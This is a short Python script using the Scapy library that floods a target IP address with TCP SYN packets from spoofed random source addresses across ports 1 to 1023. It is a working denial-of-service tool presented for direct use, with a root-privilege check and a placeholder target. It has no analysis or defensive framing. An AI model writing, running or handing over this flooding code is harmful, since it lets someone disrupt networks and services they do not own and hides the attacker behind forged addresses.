#!/usr/bin/Python
# Author   : Daniel Magevski
# Description : This scrpit will send IP packet with flag SYN on your networking with random IP source

import sys
import os
from scapy.all import *

if os.geteuid() != 0:
        exit("You need to root privileges")

IP_src="192.168.0.1" # Set your target

packet = IP(src=RandIP("*.*.*.*"),
            dst=IP_src) / \
         TCP(dport=range(1,1024), flags="S")

print "\nPress Crtl+C to stop\n"
print "Flooding target \n" + IP_src

srflood(packet)
